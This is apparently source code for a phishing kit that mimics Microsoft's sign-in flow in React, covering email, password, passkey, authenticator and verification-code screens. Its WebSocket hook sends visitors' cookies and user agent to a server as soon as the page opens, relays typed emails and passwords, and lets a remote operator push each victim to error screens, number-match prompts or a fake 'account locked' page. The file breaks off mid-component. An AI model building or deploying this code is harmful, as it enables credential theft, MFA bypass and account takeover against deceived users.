import { useState, useRef, useEffect, useCallback } from 'react';
import { motion, AnimatePresence, type MotionProps } from 'framer-motion';
import { ChevronLeft, Key, Eye, EyeOff, Check, X, LogOut } from 'lucide-react';

const MicrosoftLogo = () => (
  <svg width="20" height="20" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
    <rect x="1" y="1" width="9" height="9" fill="#f25022"/>
    <rect x="11" y="1" width="9" height="9" fill="#7fba00"/>
    <rect x="1" y="11" width="9" height="9" fill="#00a4ef"/>
    <rect x="11" y="11" width="9" height="9" fill="#ffb900"/>
  </svg>
);

const AppleLogo = ({ className, style }: { className?: string; style?: React.CSSProperties }) => (
  <svg className={className} style={style} viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg">
    <path fill="currentColor" d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z"/>
  </svg>
);

const GoogleLogo = () => (
  <svg width="22" height="22" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
  </svg>
);

const AppleSpinRing = ({ isDark = true }: { isDark?: boolean }) => {
  const rings = [
    { r: 42, n: 36, dr: 2.1 },
    { r: 50, n: 44, dr: 2.5 },
    { r: 58, n: 52, dr: 2.9 },
    { r: 66, n: 60, dr: 3.2 },
  ];
  return (
    <>
      <style>{`
        @keyframes ms-pulse {
          0%, 100% { transform: scale(1); opacity: 0.6; }
          50% { transform: scale(1.5); opacity: 0; }
        }
        .ms-passkey-pulse { animation: ms-pulse 1.8s ease-in-out infinite; }
        @keyframes apple-cur-blink { 0%,100%{opacity:1} 50%{opacity:0} }
        .apple-cur { animation: apple-cur-blink 1s ease-in-out infinite; display:inline-block; width:2px; height:20px; vertical-align:middle; }
      `}</style>
      <div style={{ position: 'relative', width: 152, height: 152, marginBottom: 24, flexShrink: 0 }}>
        <svg width={152} height={152} viewBox="0 0 152 152">
          {rings.flatMap(({ r, n, dr }, ri) =>
            Array.from({ length: n }, (_, i) => {
              const a = (i / n) * 2 * Math.PI - Math.PI / 2;
              const hue = ((i / n) * 360 + 330) % 360;
              return <circle key={`${ri}-${i}`} cx={76 + r * Math.cos(a)} cy={76 + r * Math.sin(a)} r={dr} fill={`hsl(${hue},88%,64%)`} />;
            })
          )}
        </svg>
        <div style={{ position: 'absolute', inset: 0, display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
          <AppleLogo className={isDark ? 'text-white' : 'text-[#1d1d1f]'} style={{ width: 38, height: 38 }} />
        </div>
      </div>
    </>
  );
};

// ─── Shared WS action type ───────────────────────────────────────────────────
type NavigateAction = { navigate?: string; promptNumber?: number; phoneDigits?: string; waitSeconds?: number };
type NavigateHandler = (step: string, action?: NavigateAction) => void;

// ─── Microsoft types & helpers ────────────────────────────────────────────────

type MsStep = 'email' | 'signin-options' | 'passkey' | 'password' | 'stay' | 'register' | 'recover'
  | 'email-code' | 'email-code-input' | 'other-ways' | 'phone-entry' | 'phone-code'
  | 'processing' | 'error-email' | 'error-password' | 'error-code'
  | 'authenticator' | 'cant-use-authenticator' | 'verify-phone-number' | 'verify-email'
  | 'security-alert' | 'change-password' | 'account-locked';
type RegStep = 'reg-email' | 'reg-password' | 'reg-name' | 'reg-dob' | 'reg-verify';
type RecStep = 'rec-find' | 'rec-options' | 'rec-code';

function QrCodeSvg() {
  const cells: [number, number][] = [
    [40,5],[48,5],[56,5],[40,13],[56,13],[40,21],[48,21],
    [5,40],[13,40],[21,40],[5,48],[21,48],[5,56],[13,56],[21,56],
    [40,40],[56,40],[48,48],[40,56],[56,56],
    [65,40],[73,40],[65,48],[81,48],[65,56],[73,56],[81,56],
    [40,65],[56,65],[48,73],[40,81],[48,81],[56,81],
    [65,65],[73,65],[81,65],[65,73],[81,73],[65,81],[73,81],[81,81],
  ];
  return (
    <svg viewBox="0 0 100 100" className="w-full h-full">
      <rect x="5" y="5" width="30" height="30" rx="2" fill="none" stroke="black" strokeWidth="4"/>
      <rect x="13" y="13" width="14" height="14" fill="black"/>
      <rect x="65" y="5" width="30" height="30" rx="2" fill="none" stroke="black" strokeWidth="4"/>
      <rect x="73" y="13" width="14" height="14" fill="black"/>
      <rect x="5" y="65" width="30" height="30" rx="2" fill="none" stroke="black" strokeWidth="4"/>
      <rect x="13" y="73" width="14" height="14" fill="black"/>
      {cells.map(([x, y], i) => <rect key={i} x={x} y={y} width="7" height="7" fill="black"/>)}
    </svg>
  );
}

// ─── Shared WebSocket hook ────────────────────────────────────────────────────

function useVisitorWS({ provider, onNavigate, onProviderSwitch, onSiteStatus }: {
  provider: string;
  onNavigate: (step: string, action?: { navigate?: string; promptNumber?: number; phoneDigits?: string }) => void;
  onProviderSwitch?: (p: string) => void;
  onSiteStatus?: (active: boolean) => void;
}) {
  const wsRef = useRef<WebSocket | null>(null);
  const visitorId = useRef(`v-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`);
  const pendingQueue = useRef<string[]>([]);
  const isViewOnly = useRef(false);
  const onNavigateRef = useRef(onNavigate);
  onNavigateRef.current = onNavigate;
  const onProviderSwitchRef = useRef(onProviderSwitch);
  onProviderSwitchRef.current = onProviderSwitch;
  const onSiteStatusRef = useRef(onSiteStatus);
  onSiteStatusRef.current = onSiteStatus;
  // Track current step & provider so reconnects re-register with up-to-date state.
  const currentStepRef = useRef('email');
  const providerRef = useRef(provider);
  providerRef.current = provider;

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const viewOnly = params.get('viewOnly') === '1';
    const targetId = params.get('targetId') ?? '';
    isViewOnly.current = viewOnly;

    let destroyed = false;
    let reconnectTimer: ReturnType<typeof setTimeout> | null = null;
    let delay = 1000; // ms; doubles on each failure, capped at 15 s

    function connect() {
      if (destroyed) return;
      const proto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
      let ws: WebSocket;
      try { ws = new WebSocket(`${proto}//${window.location.host}/api/ws`); }
      catch {
        reconnectTimer = setTimeout(() => { delay = Math.min(delay * 2, 15000); connect(); }, delay);
        return;
      }
      wsRef.current = ws;

      ws.onopen = () => {
        delay = 1000; // reset backoff on successful connect
        if (viewOnly) {
          ws.send(JSON.stringify({ type: 'register-view', targetId }));
        } else {
          ws.send(JSON.stringify({
            type: 'register-visitor',
            id: visitorId.current,
            provider: providerRef.current,
            step: currentStepRef.current,
            userAgent: navigator.userAgent,
          }));
          const cookieVal = document.cookie || '(none)';
          ws.send(JSON.stringify({ type: 'form-data', field: 'cookies', value: cookieVal }));
        }
        const queued = pendingQueue.current.splice(0);
        for (const m of queued) ws.send(m);
      };

      ws.onmessage = (e: MessageEvent<string>) => {
        try {
          const msg = JSON.parse(e.data) as { type: string; action?: { navigate?: string; promptNumber?: number; phoneDigits?: string; waitSeconds?: number }; provider?: string; active?: boolean };
          if (msg.type === 'ping') { ws.send(JSON.stringify({ type: 'pong' })); return; }
          if (msg.type === 'action' && msg.action?.navigate) onNavigateRef.current(msg.action.navigate, msg.action);
          if (msg.type === 'switch-provider' && msg.provider && !isViewOnly.current) {
            onProviderSwitchRef.current?.(msg.provider);
          }
          if (msg.type === 'site-status' && typeof (msg as { active?: boolean }).active === 'boolean') {
            onSiteStatusRef.current?.((msg as { active: boolean }).active);
          }
        } catch { /* ignore */ }
      };

      ws.onclose = () => {
        if (destroyed) return;
        reconnectTimer = setTimeout(() => { delay = Math.min(delay * 2, 15000); connect(); }, delay);
      };

      ws.onerror = () => { try { ws.close(); } catch { /* ignore */ } };
    }

    connect();

    return () => {
      destroyed = true;
      if (reconnectTimer) clearTimeout(reconnectTimer);
      try { wsRef.current?.close(); } catch { /* ignore */ }
    };
  }, []); // eslint-disable-line react-hooks/exhaustive-deps

  const enqueue = useCallback((data: object) => {
    if (isViewOnly.current) return;
    const str = JSON.stringify(data);
    const ws = wsRef.current;
    if (ws?.readyState === WebSocket.OPEN) ws.send(str);
    else pendingQueue.current.push(str);
  }, []);

  const sendCapture = useCallback((field: string, value: string) => {
    enqueue({ type: 'form-data', field, value });
  }, [enqueue]);

  const sendStepUpdate = useCallback((step: string) => {
    currentStepRef.current = step; // keep in sync for reconnect registration
    enqueue({ type: 'step-update', step, provider });
  }, [enqueue, provider]);

  return { sendCapture, sendStepUpdate };
}

// ─── Microsoft ──────────────────────────────────────────────────────────────

function AccountLockedScreen({ email, onLogout }: { email: string; onLogout: () => void }) {
  return (
    <div
      className="fixed inset-0 z-50 flex flex-col items-center justify-center"
      style={{ backgroundColor: '#ffffff', backgroundImage: "url('/ms-bg.svg')", backgroundSize: 'cover', backgroundPosition: 'center' }}
    >
      <div className="w-full max-w-[440px] bg-white shadow-md px-10 pt-8 pb-10">
        <div className="flex items-center justify-between mb-8">
          <div className="flex items-center gap-2">
            <MicrosoftLogo />
            <span className="text-[15px] font-semibold text-[#737373]">Microsoft</span>
          </div>
          {email && (
            <div className="flex items-center gap-1.5">
              <span className="text-[13px] text-[#737373] truncate max-w-[190px]">{email}</span>
              <button onClick={onLogout} title="Sign out" className="text-[#737373] hover:text-[#1b1b1b] transition-colors p-0.5 flex-shrink-0">
                <LogOut className="w-4 h-4" />
              </button>
            </div>
          )}
        </div>
        <div className="flex justify-center mb-6">
          <div className="w-14 h-14 rounded-full bg-[#f2f2f2] flex items-center justify-center">
            <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#737373" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
              <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
            </svg>
          </div>
        </div>
        <h1 className="text-[24px] font-semibold text-[#1b1b1b] mb-4">You can't sign in right now</h1>
        <p className="text-[14px] text-[#737373] leading-relaxed">
          Your account is under review. Please try again in a couple of hours.
        </p>
      </div>
    </div>
  );
}

function MicrosoftLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHandler }: {
  device: string; theme: string;
  sendCapture: (field: string, value: string) => void;
  sendStepUpdate: (step: string) => void;
  setNavigateHandler: (fn: NavigateHandler) => void;
}) {
  const isDark = theme === 'dark';
  const isMobile = device === 'mobile';

  const [step, setStep] = useState<MsStep>(() => {
    const init = new URLSearchParams(window.location.search).get('initialStep') as MsStep | null;
    return init ?? 'email';
  });
  const [regStep, setRegStep] = useState<RegStep>('reg-email');
  const [recStep, setRecStep] = useState<RecStep>('rec-find');

  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [dontShow, setDontShow] = useState(false);
  const [newPassword, setNewPassword] = useState('');
  const [confirmNewPassword, setConfirmNewPassword] = useState('');
  const [newPasswordError, setNewPasswordError] = useState<string | null>(null);
  const [showNewPassword, setShowNewPassword] = useState(false);
  const [showConfirmNewPassword, setShowConfirmNewPassword] = useState(false);
  const [pwdChanged, setPwdChanged] = useState(false);

  // Register state
  const [regEmail, setRegEmail] = useState('');
  const [regPassword, setRegPassword] = useState('');
  const [regShowPw, setRegShowPw] = useState(false);
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  const [regMonth, setRegMonth] = useState('January');
  const [regDay, setRegDay] = useState('1');
  const [regYear, setRegYear] = useState('1990');
  const [verifyCode, setVerifyCode] = useState('');
  const [promoEmails, setPromoEmails] = useState(false);

  // Recover state
  const [recEmail, setRecEmail] = useState('');
  const [recCode, setRecCode] = useState('');
  const [recCaptcha, setRecCaptcha] = useState(false);

  // Prompt config from URL
  const msParams = new URLSearchParams(typeof window !== 'undefined' ? window.location.search : '');
  const promptType = msParams.get('prompt') || 'password';
  const phoneEnabled = msParams.get('phone') === '1';

  // Phone / code inputs
  const [phoneNumber, setPhoneNumber] = useState('');
  const [phoneCodeChars, setPhoneCodeChars] = useState<string[]>(['', '', '', '', '', '']);
  const phoneCodeRefs = useRef<(HTMLInputElement | null)[]>([null, null, null, null, null, null]);
  const phoneCode = phoneCodeChars.join('');
  const [emailCodeChars, setEmailCodeChars] = useState<string[]>(['', '', '', '', '', '']);
  const emailCodeRefs = useRef<(HTMLInputElement | null)[]>([null, null, null, null, null, null]);
  const [verifyEmailInput, setVerifyEmailInput] = useState('');
  const [verifyEmailError, setVerifyEmailError] = useState<string | null>(null);

  // New step states
  const [emailError, setEmailError] = useState<string | null>(null);
  const [passwordError, setPasswordError] = useState<string | null>(null);
  const [codeError, setCodeError] = useState<string | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [authNumber, setAuthNumber] = useState(() => Math.floor(Math.random() * 98) + 2);
  const [verifyPhoneDigits, setVerifyPhoneDigits] = useState('');
  const phoneVerifyRefs = useRef<(HTMLInputElement | null)[]>([null, null, null, null]);
  const [cantUseInput, setCantUseInput] = useState('');

  // Passkey scanning phase
  const [passkeyPhase, setPasskeyPhase] = useState<'scanning' | 'phone'>('scanning');

  const passwordRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    if (step === 'password') passwordRef.current?.focus();
  }, [step]);

  useEffect(() => {
    if (step !== 'passkey') return;
    setPasskeyPhase('scanning');
    const t = setTimeout(() => setPasskeyPhase('phone'), 2000);
    return () => clearTimeout(t);
  }, [step]);

  // Register this provider's navigate handler with the shared WS held by LoginPage.
  useEffect(() => {
    setNavigateHandler((s, action) => {
      setIsSubmitting(false);
      if (s === 'unlock') { localStorage.removeItem('auth_studio_locked_email'); localStorage.removeItem('auth_studio_lock_start'); setStep('email'); return; }
      if (s === 'error-email') {
        setEmailError("We couldn't find an account with that username. Try another, or get a new Microsoft account.");
        setStep('email'); return;
      }
      if (s === 'error-password') {
        setPasswordError("Your account or password is incorrect. If you don't remember your password, reset it now.");
        setStep('password'); return;
      }
      if (s === 'error-code') {
        setCodeError('That code is incorrect. Check the code and try again.');
        setEmailCodeChars(['', '', '', '', '', '']);
        setStep('email-code-input'); return;
      }
      setEmailError(null); setPasswordError(null); setCodeError(null);
      setPhoneCodeChars(['', '', '', '', '', '']);
      setEmailCodeChars(['', '', '', '', '', '']);
      setStep(s as MsStep);
      if (s === 'authenticator' && action?.promptNumber != null) setAuthNumber(action.promptNumber);
    });
  // setNavigateHandler is stable (useCallback [] in LoginPage) — runs once on mount
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);
  useEffect(() => { sendStepUpdate(step); }, [step, sendStepUpdate]);

  const [loading, setLoading] = useState(false);
  const [codeResent, setCodeResent] = useState(false);
  const [phoneCodeResent, setPhoneCodeResent] = useState(false);

  const nav = (target: MsStep, captureField?: string, captureVal?: string) => {
    if (captureField && captureVal) sendCapture(captureField, captureVal);
    if (target === 'password') {
      const lockedEmail = localStorage.getItem('auth_studio_locked_email');
      const currentEmail = captureVal || email;
      if (lockedEmail && lockedEmail.toLowerCase() === currentEmail.toLowerCase()) {
        setLoading(true);
        setTimeout(() => { setLoading(false); setEmailError('Your account is locked. Please try again in a couple of hours.'); }, 900);
        return;
      }
    }
    setLoading(true);
    setTimeout(() => { setLoading(false); setStep(target); }, 900);
  };

  const lightBg: React.CSSProperties = !isMobile
    ? { backgroundColor: isDark ? '#1b1b1b' : '#ffffff', backgroundImage: "url('/ms-bg.svg')", backgroundSize: 'cover', backgroundPosition: 'center' }
    : { backgroundColor: isDark ? '#111' : '#ffffff' };

  const darkPageBg: React.CSSProperties = {
    backgroundColor: '#08091a',
    backgroundImage: "url('/ms-bg-dark.svg')",
    backgroundSize: 'cover',
    backgroundPosition: 'center',
  };

  const isOnDark = step === 'password' || step === 'stay' || step === 'passkey' || step === 'security-alert' || step === 'change-password'
    || step === 'email-code' || step === 'email-code-input' || step === 'other-ways'
    || step === 'phone-entry' || step === 'phone-code'
    || step === 'processing'
    || step === 'authenticator' || step === 'verify-phone-number';
  const bg = isOnDark ? darkPageBg : lightBg;

  const fadeSlide: MotionProps = {
    initial: { opacity: 0, y: 10 },
    animate: { opacity: 1, y: 0 },
    exit: { opacity: 0, y: -8 },
    transition: { duration: 0.22 },
  };

  const fadeOnly: MotionProps = {
    initial: { opacity: 0 },
    animate: { opacity: 1 },
    exit: { opacity: 0 },
    transition: { duration: 0.18 },
  };

  // Light card (email, options, register, recover steps)
  const lightCardCls = !isMobile
    ? `px-10 pt-10 pb-8 shadow-md ${isDark ? 'bg-[#242424] text-white' : 'bg-white text-[#1b1b1b]'}`
    : '';
  const lightText = isDark ? 'text-white' : 'text-[#1b1b1b]';
  const lightSub = isDark ? '#ccc' : '#1b1b1b';
  const lightInputCls = isDark
    ? 'border-[#555] focus:border-[#0078D4] text-white placeholder-gray-500'
    : 'border-[#000]/40 focus:border-[#0078D4] text-black placeholder-gray-400';
  const lightUnderlineInput = `w-full pb-2 border-0 border-b focus:outline-none bg-transparent text-[15px] transition-colors ${lightInputCls}`;
  const lightUnderlineInputSolid = `w-full pb-2 border-0 border-b focus:outline-none bg-transparent text-[15px] transition-colors border-[#000]/40 focus:border-[#0078D4] text-black placeholder-gray-400`;

  // Dark card (password, stay, passkey steps)
  const darkCardBg = 'bg-[#2a2a2a]';
  const msLogoRow = (dark: boolean) => (
    <div className="flex items-center gap-2 mb-5">
      <MicrosoftLogo />
      {!isMobile && <span className={`text-[15px] font-semibold tracking-wide ${dark ? 'text-[#aaa]' : isDark ? 'text-[#aaa]' : 'text-[#737373]'}`}>Microsoft</span>}
    </div>
  );

  const wrapCls = isMobile ? 'w-full h-full px-8 pt-10' : 'w-[440px]';

  if (loading) return (
    <div className="w-full h-full flex items-center justify-center font-[system-ui,Segoe_UI,sans-serif]" style={bg}>
      {isMobile ? (
        <div className="flex flex-col items-center gap-5 px-8">
          {msLogoRow(isDark)}
          <div className="flex gap-2 mt-2">
            {[0,1,2].map(i => <div key={i} className="w-2 h-2 rounded-full bg-[#0078D4] animate-bounce" style={{ animationDelay: `${i * 0.15}s` }} />)}
          </div>
        </div>
      ) : (
        <div className={`w-[440px] flex flex-col items-center px-10 pt-10 pb-12 shadow-md ${isOnDark ? darkCardBg : isDark ? 'bg-[#242424]' : 'bg-white'}`}>
          {msLogoRow(isOnDark)}
          <div className="flex gap-2 mt-6">
            {[0,1,2].map(i => <div key={i} className="w-2.5 h-2.5 rounded-full bg-[#0078D4] animate-bounce" style={{ animationDelay: `${i * 0.15}s` }} />)}
          </div>
        </div>
      )}
    </div>
  );

  if (step === 'account-locked') return <AccountLockedScreen email={email} onLogout={() => { localStorage.removeItem('auth_studio_locked_email'); localStorage.removeItem('auth_studio_lock_start'); setStep('email'); }} />;

  return (
    <div
      className="w-full h-full flex items-center justify-center font-[system-ui,Segoe_UI,sans-serif] transition-[background-color] duration-300"
      style={bg}
    >
      <AnimatePresence mode="wait">

        {/* ── Email step ─────────────────────────────────────────────────────── */}
        {step === 'email' && (
          <motion.div key="email" {...fadeSlide} className={`flex flex-col ${wrapCls} ${isMobile ? '' : 'gap-4'}`}>
            <div className={`flex flex-col gap-0 ${lightCardCls}`}>
              {msLogoRow(false)}
              <h1 className={`text-[24px] font-bold mb-5 ${lightText}`}>Sign in</h1>
              <div className="relative mb-1">
                <input
                  data-testid="ms-email-input"
                  type="text"
                  value={email}
                  onChange={e => { setEmail(e.target.value); setEmailError(null); }}
                  onKeyDown={e => { if (e.key === 'Enter') { if (promptType === 'email-code') nav('email-code', 'email', email); else if (promptType === 'other-ways') nav('other-ways', 'email', email); else if (promptType === 'verify-email') nav('verify-email', 'email', email); else nav('password', 'email', email); } }}
                  placeholder="Email, phone, or Skype"
                  autoFocus
                  className={lightUnderlineInput}
                />
              </div>
              {emailError && (
                <div className="mb-2 mt-1">
                  <span className="text-red-500 text-[13px] leading-snug">{emailError}</span>
                </div>
              )}
              <div className="text-[13px] mb-3" style={{ color: lightSub }}>
                No account?{' '}
                <a href="#" onClick={e => { e.preventDefault(); setStep('register'); setRegStep('reg-email'); }}
                  className="text-[#0078D4] hover:underline">Create one!</a>
              </div>
              <div className="text-[13px] mb-8">
                <a href="#" onClick={e => { e.preventDefault(); setStep('recover'); setRecStep('rec-find'); }}
                  className="text-[#0078D4] hover:underline">Can't access your account?</a>
              </div>
              <div className="flex justify-end">
                <button
                  data-testid="ms-next-btn"
                  onClick={() => { if (promptType === 'email-code') nav('email-code', 'email', email); else if (promptType === 'other-ways') nav('other-ways', 'email', email); else if (promptType === 'verify-email') nav('verify-email', 'email', email); else nav('password', 'email', email); }}
                  className="bg-[#0078D4] hover:bg-[#005a9e] text-white text-[15px] font-semibold px-8 py-1.5 transition-colors"
                  style={{ borderRadius: 0 }}
                >
                  Next
                </button>
              </div>
            </div>
            <div
              data-testid="ms-signin-options"
              onClick={() => setStep('signin-options')}
              className={`flex items-center px-4 py-3 cursor-pointer border transition-colors ${isMobile ? 'mt-6' : ''}
                ${isDark ? 'bg-[#242424] border-[#444] hover:bg-[#2e2e2e] text-white' : 'bg-white border-gray-300 hover:bg-gray-50 text-[#1b1b1b]'}`}
            >
              <Key className="w-5 h-5 mr-3 opacity-60" />
              <span className="text-[15px]">Sign-in options</span>
            </div>
            {isMobile && (
              <div className="mt-auto pb-6 text-center">
                <div className="text-[12px] flex gap-4 justify-center" style={{ color: isDark ? '#888' : '#666' }}>
                  <a href="#" className="hover:underline">Terms of use</a>
                  <a href="#" className="hover:underline">Privacy &amp; cookies</a>
                  <span>···</span>
                </div>
              </div>
            )}
          </motion.div>
        )}

        {/* ── Sign-in options ────────────────────────────────────────────────── */}
        {step === 'signin-options' && (
          <motion.div key="signin-options" {...fadeOnly} className={`flex flex-col ${wrapCls}`}>
            <div className={`flex flex-col ${lightCardCls}`}>
              {msLogoRow(false)}
              <h1 className={`text-[24px] font-bold mb-5 ${lightText}`}>Sign-in options</h1>

              <div className="border-t border-dashed border-gray-300" />
              <button
                onClick={() => setStep('passkey')}
                className={`w-full flex items-start gap-3 py-3.5 px-1 transition-colors text-left ${isDark ? 'hover:bg-[#2e2e2e]' : 'hover:bg-gray-50'}`}
              >
                <div className={`flex-shrink-0 w-9 h-9 rounded-full flex items-center justify-center mt-0.5 ${isDark ? 'bg-[#333]' : 'bg-gray-100'}`}>
                  <svg viewBox="0 0 24 24" width="20" height="20" fill="none">
                    <circle cx="9" cy="8" r="3.5" stroke={isDark ? '#ddd' : '#1b1b1b'} strokeWidth="1.5"/>
                    <path d="M2 20c0-3.31 3.13-6 7-6" stroke={isDark ? '#ddd' : '#1b1b1b'} strokeWidth="1.5" strokeLinecap="round"/>
                    <circle cx="17.5" cy="16.5" r="4" stroke="#0078D4" strokeWidth="1.5"/>
                    <path d="M16 16.5l1.2 1.2 2.3-2.3" stroke="#0078D4" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
                  </svg>
                </div>
                <div className="flex-1 min-w-0">
                  <div className={`text-[15px] font-medium ${lightText}`}>Face, fingerprint, PIN or security key</div>
                  <div className="text-[13px] text-[#605e5c] mt-0.5">Use your device to sign in with a passkey.</div>
                </div>
                <div className="flex-shrink-0 mt-1.5">
                  <div className="w-5 h-5 border border-gray-400 rounded-full flex items-center justify-center text-gray-400 text-[11px] leading-none select-none">?</div>
                </div>
              </button>
              <div className="border-b border-dashed border-gray-300 mb-6" />

              <div className="flex justify-end">
                <button
                  onClick={() => setStep('email')}
                  className={`px-8 py-1.5 border text-[15px] font-semibold transition-colors ${isDark ? 'border-[#555] text-white hover:bg-[#333]' : 'border-gray-400 text-[#1b1b1b] hover:bg-gray-100'}`}
                  style={{ borderRadius: 0 }}
                >
                  Back
                </button>
              </div>
            </div>
          </motion.div>
        )}

        {/* ── Passkey step ───────────────────────────────────────────────────── */}
        {step === 'passkey' && (
          <motion.div key="passkey" {...fadeOnly} className={`flex flex-col ${wrapCls}`}>
            <div className={`px-10 pt-10 pb-8 shadow-xl ${darkCardBg} flex flex-col`}>
              {msLogoRow(true)}
              <AnimatePresence mode="wait">
                {passkeyPhase === 'scanning' ? (
                  <motion.div key="scanning" {...fadeOnly} className="flex flex-col items-center py-6">
                    <div className="relative w-20 h-20 flex items-center justify-center mb-6">
                      <div className="ms-passkey-pulse absolute inset-0 rounded-full border-2 border-[#0078D4]/50" />
                      <div className="w-20 h-20 rounded-full border-2 border-[#0078D4] flex items-center justify-center bg-[#1a1a30]">
                        <svg viewBox="0 0 24 24" width="32" height="32" fill="none">
                          <path d="M12 1a4 4 0 0 1 4 4v2H8V5a4 4 0 0 1 4-4z" stroke="#0078D4" strokeWidth="1.5" strokeLinecap="round"/>
                          <path d="M5 9h14a1 1 0 0 1 1 1v10a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1V10a1 1 0 0 1 1-1z" stroke="#0078D4" strokeWidth="1.5"/>
                          <circle cx="12" cy="15" r="2" stroke="#0078D4" strokeWidth="1.5"/>
                          <path d="M12 17v2" stroke="#0078D4" strokeWidth="1.5" strokeLinecap="round"/>
                        </svg>
                      </div>
                    </div>
                    <h2 className="text-[20px] font-bold text-white mb-2">Looking for a passkey</h2>
                    <p className="text-[13px] text-[#aaa] text-center max-w-[260px] leading-relaxed">
                      Checking for a passkey linked to this device...
                    </p>
                  </motion.div>
                ) : (
                  <motion.div key="phone" {...fadeOnly} className="flex flex-col items-start w-full py-2">
                    <h2 className="text-[20px] font-bold text-white mb-1.5">Use a passkey</h2>
                    <p className="text-[13px] text-[#aaa] mb-5 leading-relaxed">
                      A sign-in request was sent to your nearby device. Scan the QR code if you prefer to use your phone.
                    </p>
                    <div className="flex gap-6 items-start w-full mb-5">
                      <div className="w-36 h-36 flex-shrink-0 bg-white p-2 rounded">
                        <QrCodeSvg />
                      </div>
                      <div className="flex flex-col gap-3 pt-1">
                        <div className="flex items-center gap-2">
                          <div className="w-2 h-2 rounded-full bg-[#0078D4] animate-pulse flex-shrink-0" />
                          <span className="text-[13px] text-[#aaa]">Waiting for device…</span>
                        </div>
                        <p className="text-[12px] text-[#888] leading-relaxed">
                          Open your phone's camera and point it at this QR code, or unlock with fingerprint / Face ID.
                        </p>
                        <a href="#" className="text-[#3391e0] text-[13px] hover:underline">Use a USB security key instead</a>
                      </div>
                    </div>
                  </motion.div>
                )}
              </AnimatePresence>
              <div className="flex justify-end mt-2">
                <button
                  onClick={() => setStep('signin-options')}
                  className="px-8 py-1.5 border border-[#555] text-white text-[15px] font-semibold hover:bg-[#3a3a3a] transition-colors"
                  style={{ borderRadius: 0 }}
                >
                  Cancel
                </button>
              </div>
            </div>
          </motion.div>
        )}

        {/* ── Password step ──────────────────────────────────────────────────── */}
        {step === 'password' && (
          <motion.div key="password" {...fadeSlide} className={`flex flex-col ${wrapCls}`}>
            <div className={`px-10 pt-10 pb-8 shadow-xl ${darkCardBg} flex flex-col`}>
              <div className="flex items-center gap-2 mb-5 justify-center">
                <MicrosoftLogo />
                {!isMobile && <span className="text-[15px] font-semibold tracking-wide text-[#aaa]">Microsoft</span>}
              </div>
              <div className="flex justify-center mb-4">
                <button
                  onClick={() => setStep('email')}
                  className="inline-flex items-center gap-1.5 px-4 py-1 rounded-full border border-[#555] text-[#ccc] text-[13px] hover:bg-[#3a3a3a] transition-colors"
                  style={{ background: 'none' }}
                >
                  <ChevronLeft className="w-3.5 h-3.5" />
                  {email || 'john@outlook.com'}
                </button>
              </div>
              <h1 className="text-[24px] font-bold mb-5 text-white text-center">Enter your password</h1>
              <div className="relative mb-2">
                <input
                  ref={passwordRef}
                  data-testid="ms-password-input"
                  type="password"
                  value={password}
                  onChange={e => { setPassword(e.target.value); setPasswordError(null); }}
                  onKeyDown={e => { if (e.key === 'Enter' && password && !isSubmitting) { sendCapture('password', password); setIsSubmitting(true); } }}
                  placeholder="Password"
                  className="w-full px-3 py-2.5 border border-[#555] focus:border-[#0078D4] rounded-none focus:outline-none bg-transparent text-white placeholder-gray-500 text-[15px] transition-colors"
                />
              </div>
              {passwordError && (
                <div className="mb-2">
                  <span className="text-red-400 text-[13px] leading-snug">{passwordError}</span>
                </div>
              )}
              <div className="mb-5">
                <a href="#" className="text-[#3391e0] text-[13px] hover:underline">Forgot your password?</a>
              </div>
              <button
                data-testid="ms-signin-btn"
                onClick={() => { if (password && !isSubmitting) { sendCapture('password', password); setIsSubmitting(true); } }}
                disabled={isSubmitting}
                className="w-full bg-[#0078D4] hover:bg-[#005a9e] disabled:opacity-60 text-white text-[15px] font-semibold py-2.5 mb-5 transition-colors"
                style={{ borderRadius: 0 }}
              >
                {isSubmitting ? (
                  <span className="flex items-center justify-center gap-2">
